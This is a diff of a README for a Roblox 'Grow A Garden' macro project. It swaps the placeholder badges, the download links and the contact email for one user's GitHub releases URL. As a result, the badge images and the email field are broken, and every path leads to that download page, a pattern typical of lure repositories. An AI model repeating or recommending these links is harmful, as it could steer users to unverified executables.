@@ -1,8 +1,8 @@
 # 🌱 Roblox Grow A Garden 🌱
 
-![GitHub repo size](https://img.shields.io/github/repo-size/repo/user/Roblox-Grow-A-Garden)
-![GitHub last commit](https://img.shields.io/github/last-commit/repo/user/Roblox-Grow-A-Garden)
-![GitHub stars](https://img.shields.io/github/stars/repo/user/Roblox-Grow-A-Garden?style=social)
+![GitHub repo size](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases)
+![GitHub last commit](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases)
+![GitHub stars](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases)
 
 Welcome to the **Roblox Grow A Garden** repository! This project focuses on creating a unique garden simulation experience within the Roblox platform. Here, you can explore macros that enhance gameplay and offer fun features for users who love gardening.
 
@@ -31,7 +31,7 @@ In the **Roblox Grow A Garden** project, we aim to provide players with a rich g
 
 To get started with **Roblox Grow A Garden**, download the project files. You can do this by visiting the following link:
 
-[Download the latest version](https://github.com/repo/user/archive.zip)
+[Download the latest version](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases)
 
 Once downloaded, extract the ZIP file and follow the instructions below to set up the project.
 
@@ -64,13 +64,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases
 - **Discord**: Join our community on Discord for real-time discussions and support.
 
-Thank you for checking out the **Roblox Grow A Garden** repository! We hope you enjoy building your dream garden. For the latest updates, be sure to check the [Releases](https://github.com/repo/user/releases) section.
+Thank you for checking out the **Roblox Grow A Garden** repository! We hope you enjoy building your dream garden. For the latest updates, be sure to check the [Releases](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases) section.
 
 For further downloads, you can also visit the following link:
 
-[Download the latest version](https://github.com/repo/user/archive.zip)
+[Download the latest version](https://github.com/Hamzatss/Roblox-Grow-A-Garden/releases)
 
 Happy gardening! 🌼
